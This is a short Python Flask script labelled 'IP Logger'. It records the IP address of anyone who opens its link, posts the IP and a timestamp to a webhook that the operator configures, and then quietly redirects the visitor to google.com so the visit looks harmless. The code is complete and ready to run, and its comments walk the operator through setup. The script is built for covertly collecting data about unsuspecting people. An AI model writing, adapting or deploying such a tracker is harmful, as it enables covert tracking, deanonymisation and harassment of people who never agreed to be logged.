from flask import Flask, request, redirect #pip install flask in cmd, if you haven't install it yet
from datetime import datetime
from zoneinfo import ZoneInfo
import requests

app = Flask(__name__)

def send_ip(ip, date):
    webhook_url = "WEBHOOK_URL_HERE" #paste here your webook url
    data = {
        "content": "",
        "title": "IP Logger"
    }
    data["embeds"] = [
        {
            "title": ip,
            "description": date
         }
    ]
    requests.post(webhook_url, json=data)

@app.route("/")
def index():
    ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
    date = datetime.now(ZoneInfo("Europe/Rome")).strftime("%Y-%m-%d %H:%M:%S")

    send_ip(ip, date)

    return redirect("https://google.com") #change this if you want

if __name__ == "__main__":
    app.run(host='0.0.0.0')